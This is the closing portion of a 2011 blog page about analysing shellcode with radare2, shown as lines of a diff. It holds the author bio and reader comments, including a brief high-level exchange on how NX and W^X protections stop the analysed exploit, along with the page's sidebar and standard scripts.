share-icon no-text" href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#print" target="_blank" title="Click to print"><span></span><span class="sharing-screen-reader-text">Click to print (Opens in new window)</span></a></li><li class="share-end"></li></ul></div></div></div>											</div><!-- .entry-content -->
+
+					<div id="entry-author-info">
+						<div id="author-avatar">
+							<img alt='' src='//2.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=60&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=120&amp;d=mm&amp;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' />						</div><!-- #author-avatar -->
+						<div id="author-description">
+							<h2>About Edd</h2>
+							Edd is a open-source enthusiast, PhD student, OpenBSD developer and general computer pessimist :)							<div id="author-link">
+								<a href="http://canthack.org/wp-content/plugins/really-static/static/author/edd/" rel="author">
+									View all posts by Edd <span class="meta-nav">&rarr;</span>								</a>
+							</div><!-- #author-link	-->
+						</div><!-- #author-description -->
+					</div><!-- #entry-author-info -->
+
+					<div class="entry-utility">
+						This entry was posted in <a href="http://canthack.org/wp-content/plugins/really-static/static/category/software/" rel="category tag">Software</a>. Bookmark the <a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" title="Permalink to Adventures with Radare2 #1: A Simple Shellcode Analysis" rel="bookmark">permalink</a>.											</div><!-- .entry-utility -->
+				</div><!-- #post-## -->
+
+				<div id="nav-below" class="navigation">
+					<div class="nav-previous"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/phphgdc-a-php-client-for-hgd/" rel="prev"><span class="meta-nav">&larr;</span> phphgdc &#8211; A PHP client for HGD</a></div>
+					<div class="nav-next"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/hgd-0-4-1/" rel="next">HGD 0.4.1 out now! <span class="meta-nav">&rarr;</span></a></div>
+				</div><!-- #nav-below -->
+
+				
+			<div id="comments">
+
+
+			<h3 id="comments-title">7 Responses to <em>Adventures with Radare2 #1: A Simple Shellcode Analysis</em></h3>
+
+
+			<ol class="commentlist">
+					<li class="comment even thread-even depth-1" id="li-comment-4034">
+		<div id="comment-4034">
+			<div class="comment-author vcard">
+				<img alt='' src='//2.gravatar.com/avatar/b593b7582dd3fab448441ecd3e19063f?s=40&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/b593b7582dd3fab448441ecd3e19063f?s=80&amp;d=mm&amp;r=g 2x' class='avatar avatar-40 photo' height='40' width='40' />				<cite class="fn"><a href='http://david-halliday.co.uk' rel='external nofollow' class='url'>David Halliday</a></cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->
+			
+			<div class="comment-meta commentmetadata"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#comment-4034/index.html">
+				July 17, 2011 at 19:27</a>			</div><!-- .comment-meta .commentmetadata -->
+
+			<div class="comment-body"><p>I understood (almost) every word of this. </p>
+<p>Just like when I looked into disassembly a few years ago. The theory is straight forward, a few registers and a handful of commands&#8230; Simpler than understanding a large C++ framework (in theory).</p>
+<p>Actually doing it&#8230; Haha never managed that one.</p>
+<p>A couple of questions on: &#8220;this exploit should not work on modern operating systems&#8221;<br />
+1: I presume that my *nix machines running distributions from within the past year are their-for covered for this exploit?<br />
+2: If so, who is this exploit set to target or is it just an &#8220;academic&#8221; exercise?</p>
+</div>
+
+			<div class="reply">
+				<a class='comment-reply-link' href='/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?replytocom=4034#respond' onclick='return addComment.moveForm( "comment-4034", "4034", "respond", "804" )' aria-label='Reply to David Halliday'>Reply</a>			</div><!-- .reply -->
+		</div><!-- #comment-##  -->
+
+	</li><!-- #comment-## -->
+	<li class="comment byuser comment-author-edd bypostauthor odd alt thread-odd thread-alt depth-1" id="li-comment-4035">
+		<div id="comment-4035">
+			<div class="comment-author vcard">
+				<img alt='' src='//2.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=40&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/2b68fe77303968e573ca1e7004462ae7?s=80&amp;d=mm&amp;r=g 2x' class='avatar avatar-40 photo' height='40' width='40' />				<cite class="fn">Edd</cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->
+			
+			<div class="comment-meta commentmetadata"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#comment-4035/index.html">
+				July 17, 2011 at 22:18</a>			</div><!-- .comment-meta .commentmetadata -->
+
+			<div class="comment-body"><p>Hi David,</p>
+<p>Thanks for reading.</p>
+<p>1) It turns out that this write-xor-execute scheme is actually implemented in hardware in modern architectures (the so called NX bit). Some architectures (i386, &#8230;)  do not have this hardware protection, but I understand it can be implemented in software.</p>
+<p>2) I guess that if you run an architecture with no NX-a-like functionality on a kernel which does not implement W^X in software, then it is still possible. If you read the comment in the source code, the author claims that this worked in 2010 on a Debian system, but that is not much to go by.</p>
+<p>Sorry I can not be more specific. I am pretty new to all of this.</p>
+</div>
+
+			<div class="reply">
+				<a class='comment-reply-link' href='/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?replytocom=4035#respond' onclick='return addComment.moveForm( "comment-4035", "4035", "respond", "804" )' aria-label='Reply to Edd'>Reply</a>			</div><!-- .reply -->
+		</div><!-- #comment-##  -->
+
+	</li><!-- #comment-## -->
+	<li class="comment even thread-even depth-1" id="li-comment-4037">
+		<div id="comment-4037">
+			<div class="comment-author vcard">
+				<img alt='' src='//1.gravatar.com/avatar/1da1decf15144146262b834cd4c75644?s=40&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/1da1decf15144146262b834cd4c75644?s=80&amp;d=mm&amp;r=g 2x' class='avatar avatar-40 photo' height='40' width='40' />				<cite class="fn"><a href='http://gunslingerc0de.wordpress.com' rel='external nofollow' class='url'>gunslinger_</a></cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->
+			
+			<div class="comment-meta commentmetadata"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#comment-4037/index.html">
+				July 18, 2011 at 04:36</a>			</div><!-- .comment-meta .commentmetadata -->
+
+			<div class="comment-body"><p>Fantastic work bro !<br />
+i really enjoy, keep it up !</p>
+</div>
+
+			<div class="reply">
+				<a class='comment-reply-link' href='/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?replytocom=4037#respond' onclick='return addComment.moveForm( "comment-4037", "4037", "respond", "804" )' aria-label='Reply to gunslinger_'>Reply</a>			</div><!-- .reply -->
+		</div><!-- #comment-##  -->
+
+	</li><!-- #comment-## -->
+	<li class="comment byuser comment-author-tris odd alt thread-odd thread-alt depth-1" id="li-comment-4048">
+		<div id="comment-4048">
+			<div class="comment-author vcard">
+				<img alt='' src='//0.gravatar.com/avatar/341c531b300cc77f6195b4fb0cb01b9c?s=40&#038;d=mm&#038;r=g' srcset='http://0.gravatar.com/avatar/341c531b300cc77f6195b4fb0cb01b9c?s=80&amp;d=mm&amp;r=g 2x' class='avatar avatar-40 photo' height='40' width='40' />				<cite class="fn">Tris</cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->
+			
+			<div class="comment-meta commentmetadata"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#comment-4048/index.html">
+				July 19, 2011 at 10:12</a>			</div><!-- .comment-meta .commentmetadata -->
+
+			<div class="comment-body"><p>I really enjoyed this post. Very interesting.</p>
+</div>
+
+			<div class="reply">
+				<a class='comment-reply-link' href='/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?replytocom=4048#respond' onclick='return addComment.moveForm( "comment-4048", "4048", "respond", "804" )' aria-label='Reply to Tris'>Reply</a>			</div><!-- .reply -->
+		</div><!-- #comment-##  -->
+
+	</li><!-- #comment-## -->
+	<li class="comment even thread-even depth-1" id="li-comment-4054">
+		<div id="comment-4054">
+			<div class="comment-author vcard">
+				<img alt='' src='//2.gravatar.com/avatar/8c438d9582815dbb73447d635ef01ca5?s=40&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/8c438d9582815dbb73447d635ef01ca5?s=80&amp;d=mm&amp;r=g 2x' class='avatar avatar-40 photo' height='40' width='40' />				<cite class="fn">Nick</cite> <span class="says">says:</span>			</div><!-- .comment-author .vcard -->
+			
+			<div class="comment-meta commentmetadata"><a href="http://canthack.org/wp-content/plugins/really-static/static/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#comment-4054/index.html">
+				July 21, 2011 at 08:25</a>			</div><!-- .comment-meta .commentmetadata -->
+
+			<div class="comment-body"><p>Good read</p>
+</div>
+
+			<div class="reply">
+				<a class='comment-reply-link' href='/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/?replytocom=4054#respond' onclick='return addComment.moveForm( "comment-4054", "4054", "respond", "804" )' aria-label='Reply to Nick'>Reply</a>			</div><!-- .reply -->
+		</div><!-- #comment-##  -->
+
+	</li><!-- #comment-## -->
+	<li class="post pingback">
+		<p>Pingback: <a href='http://pcbo.dcs.aber.ac.uk/blog/2011/08/13/from-oggcamp/' rel='external nofollow' class='url'>Wolf&#8217;s Spoor | from oggcamp</a></p>
+	</li><!-- #comment-## -->
+	<li class="post pingback">
+		<p>Pingback: <a href='http://www.hackdox.com/huge-list-of-pentesting-links-nice-makes-me-want-to-create-a-huge-links-database-now/' rel='external nofollow' class='url'>Huge List of Pentesting links.. Nice, makes me want to create a huge links database now | HåCkDÖx</a></p>
+	</li><!-- #comment-## -->
+			</ol>
+
+
+	
+
+						<div id="respond" class="comment-respond">
+				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/#respond" style="display:none;">Cancel reply</a></small></h3>
+									<form action="//canthack.org/wp-comments-post.php" method="post" id="commentform" class="comment-form">
+																			<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p>							<p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" aria-required='true' required='required' /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" aria-describedby="email-notes" aria-required='true' required='required' /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" /></p>
+												<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" aria-describedby="form-allowed-tags" aria-required="true" required="required"></textarea></p>						<p class="form-allowed-tags" id="form-allowed-tags">You may use these <abbr title="HyperText Markup Language">HTML</abbr> tags and attributes:  <code>&lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;s&gt; &lt;strike&gt; &lt;strong&gt; </code></p>
+						<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='804' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="de9e9ea1f1" /></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_comments" id="subscribe_comments" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-label" for="subscribe_comments">Notify me of follow-up comments by email.</label></p><p class="comment-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto; -moz-appearance: checkbox; -webkit-appearance: checkbox;" /> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog">Notify me of new posts by email.</label></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="103"/></p>					</form>
+							</div><!-- #respond -->
+			
+</div><!-- #comments -->
+
+
+			</div><!-- #content -->
+		</div><!-- #container -->
+
+
+		<div id="primary" class="widget-area" role="complementary">
+			<ul class="xoxo">
+
+<li id="search-2" class="widget-container widget_search"><form role="search" method="get" id="searchform" class="searchform" action="//canthack.org/wp-content/plugins/really-static/static/">
+				<div>
+					<label class="screen-reader-text" for="s">Search for:</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="Search" />
+				</div>
+			</form></li>		<li id="recent-posts-2" class="widget-container widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
+					<li>
+				<a href="http://canthack.org/wp-content/plugins/really-static/static/2014/04/a-new-mod-for-mega-drive-60hz-colour-correction/">A new mod for Mega Drive 60Hz colour correction</a>
+						</li>
+					<li>
+				<a href="http://canthack.org/wp-content/plugins/really-static/static/2013/06/barcamp-canterbury-2013-round-up/">BarCamp Canterbury 2013 round-up</a>
+						</li>
+					<li>
+				<a href="http://canthack.org/wp-content/plugins/really-static/static/2013/04/pipurr-the-remote-cat-interaction-server/">PiPurr &#8211; The Remote Cat Interaction Server</a>
+						</li>
+					<li>
+				<a href="http://canthack.org/wp-content/plugins/really-static/static/2012/09/introducing-the-sin-edds-ym2612-midi-instrument/">Introducing &#8216;The Sin': Edd&#8217;s YM2612 MIDI Instrument</a>
+						</li>
+					<li>
+				<a href="http://canthack.org/wp-content/plugins/really-static/static/2012/08/oggcamp-12/">OggCamp 12</a>
+						</li>
+				</ul>
+		</li><li id="recent-comments-2" class="widget-container widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='https://balau82.wordpress.com/2011/03/29/programming-arduino-uno-in-pure-c/' rel='external nofollow' class='url'>Programming Arduino Uno in pure C | Freedom Embedded</a></span> on <a href="http://canthack.org/wp-content/plugins/really-static/static/2010/12/programming-the-arduino-in-pure-c/#comment-57224/index.html">Programming the Arduino in Pure C.</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://zeidman.biz/blog/?p=11' rel='external nofollow' class='url'>Building an Arduino Robot using SynthOS | Zeidman Technologies Blog</a></span> on <a href="http://canthack.org/wp-content/plugins/really-static/static/2010/12/programming-the-arduino-in-pure-c/#comment-54358/index.html">Programming the Arduino in Pure C.</a></li><li class="recentcomments"><span class="comment-author-link">black</span> on <a href="http://canthack.org/wp-content/plugins/really-static/static/2014/04/a-new-mod-for-mega-drive-60hz-colour-correction/#comment-45466/index.html">A new mod for Mega Drive 60Hz colour correction</a></li><li class="recentcomments"><span class="comment-author-link">Cami</span> on <a href="http://canthack.org/wp-content/plugins/really-static/static/2014/04/a-new-mod-for-mega-drive-60hz-colour-correction/#comment-44423/index.html">A new mod for Mega Drive 60Hz colour correction</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://famfest.info' rel='external nofollow' class='url'>Manu</a></span> on <a href="http://canthack.org/wp-content/plugins/really-static/static/2012/09/introducing-the-sin-edds-ym2612-midi-instrument/#comment-39117/index.html">Introducing &#8216;The Sin': Edd&#8217;s YM2612 MIDI Instrument</a></li></ul></li><li id="archives-2" class="widget-container widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2014/04/'>April 2014</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2013/06/'>June 2013</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2013/04/'>April 2013</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2012/09/'>September 2012</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2012/08/'>August 2012</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2012/06/'>June 2012</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2012/05/'>May 2012</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2012/04/'>April 2012</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2012/03/'>March 2012</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/12/'>December 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/11/'>November 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/10/'>October 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/09/'>September 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/07/'>July 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/06/'>June 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/05/'>May 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/04/'>April 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/03/'>March 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/02/'>February 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2011/01/'>January 2011</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2010/12/'>December 2010</a></li>
+	<li><a href='http://canthack.org/wp-content/plugins/really-static/static/2010/11/'>November 2010</a></li>
+		</ul>
+</li><li id="categories-2" class="widget-container widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+	<li class="cat-item cat-item-7"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/hardware/arduino/" >Arduino</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/crafting/" >Crafting</a>
+</li>
+	<li class="cat-item cat-item-16"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/events/" >Events</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/gardening/" >Gardening</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/hardware/" >Hardware</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/programming/" >Programming</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/software/" >Software</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/uncategorized/" >Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-3"><a href="http://canthack.org/wp-content/plugins/really-static/static/category/unix/" >Unix</a>
+</li>
+		</ul>
+</li><li id="meta-2" class="widget-container widget_meta"><h3 class="widget-title">Meta</h3>			<ul>
+						<li><a href="http://canthack.org/wp-content/plugins/really-static/static/wp-login.php">Log in</a></li>
+			<li><a href="http://canthack.org/wp-content/plugins/really-static/static/feed/">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://canthack.org/wp-content/plugins/really-static/static/comments/feed/">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+<li><a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>			</ul>
+</li>			</ul>
+		</div><!-- #primary .widget-area -->
+
+	</div><!-- #main -->
+
+	<div id="footer" role="contentinfo">
+		<div id="colophon">
+
+
+
+			<div id="site-info">
+				<a href="http://canthack.org/wp-content/plugins/really-static/static/" title="Can&#039;t Hack, Won&#039;t Hack" rel="home">
+					Can&#039;t Hack, Won&#039;t Hack				</a>
+			</div><!-- #site-info -->
+
+			<div id="site-generator"><a href="http://www.php-welt.net/really-static/">powered by really static WordPress</a></div><!-- #site-generator -->
+
+		</div><!-- #colophon -->
+	</div><!-- #footer -->
+
+</div><!-- #wrapper -->
+
+	<div style="display:none">
+	<div class="grofile-hash-map-2b68fe77303968e573ca1e7004462ae7">
+	</div>
+	<div class="grofile-hash-map-b593b7582dd3fab448441ecd3e19063f">
+	</div>
+	<div class="grofile-hash-map-2b68fe77303968e573ca1e7004462ae7">
+	</div>
+	<div class="grofile-hash-map-1da1decf15144146262b834cd4c75644">
+	</div>
+	<div class="grofile-hash-map-341c531b300cc77f6195b4fb0cb01b9c">
+	</div>
+	<div class="grofile-hash-map-8c438d9582815dbb73447d635ef01ca5">
+	</div>
+	</div>
+
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"http:\/\/canthack.org\/wp-content\/plugins\/really-static\/static\/2011\/07\/adventures-with-radare-1-a-simple-shellcode-analysis\/":804};
+		window.WPCOM_jetpack = true;
+			</script>
+		<script type="text/javascript">
+			var windowOpen;
+		jQuery(document).on( 'ready post-load', function(){
+			jQuery( 'a.share-facebook' ).on( 'click', function() {
+				if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+		});
+		</script>
+				<script type="text/javascript">
+			var windowOpen;
+		jQuery(document).on( 'ready post-load', function(){
+			jQuery( 'a.share-twitter' ).on( 'click', function() {
+				if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+		});
+		</script>
+			<div id="sharing_email" style="display: none;">
+		<form action="/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" method="post">
+			<label for="target_email">Send to Email Address</label>
+			<input type="email" name="target_email" id="target_email" value="" />
+
+			
+				<label for="source_name">Your Name</label>
+				<input type="text" name="source_name" id="source_name" value="" />
+
+				<label for="source_email">Your Email Address</label>
+				<input type="email" name="source_email" id="source_email" value="" />
+
+						<input type="text" id="jetpack-source_f_name" name="source_f_name" class="input" value="" size="25" autocomplete="off" />
+			<script> document.getElementById('jetpack-source_f_name').value = ''; </script>
+			
+			<img style="float: right; display: none" class="loading" src="//canthack.org/wp-content/plugins/jetpack/modules/sharedaddy/images/loading.gif" alt="loading" width="16" height="16" />
+			<input type="submit" value="Send Email" class="sharing_send" />
+			<a rel="nofollow" href="#cancel" class="sharing_cancel">Cancel</a>
+
+			<div class="errors errors-1" style="display: none;">
+				Post was not sent - check your email addresses!			</div>
+
+			<div class="errors errors-2" style="display: none;">
+				Email check failed, please try again			</div>
+
+			<div class="errors errors-3" style="display: none;">
+				Sorry, your blog cannot share posts by email.			</div>
+		</form>
+	</div>
+<script type='text/javascript' src='//canthack.org/wp-content/plugins/akismet/_inc/form.js?ver=3.1.1'></script>
+<script type='text/javascript' src='//canthack.org/wp-includes/js/comment-reply.min.js?ver=4.2.2'></script>
+<script type='text/javascript' src='//s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201521'></script>
+<script type='text/javascript' src='//s.gravatar.com/js/gprofiles.js?ver=2015Mayaa'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//canthack.org/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.2.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//canthack.org/wp-content/plugins/jetpack/modules/sharedaddy/sharing.js?ver=3.5.3'></script>
+<script type='text/javascript' src='//stats.wp.com/e-201521.js' async defer></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:3.5.3',blog:'21421473',post:'804',tz:'0',srv:'canthack.org'} ]);
+	_stq.push([ 'clickTrackerInit', '21421473', '804' ]);
+</script>
+</body>
+</html>
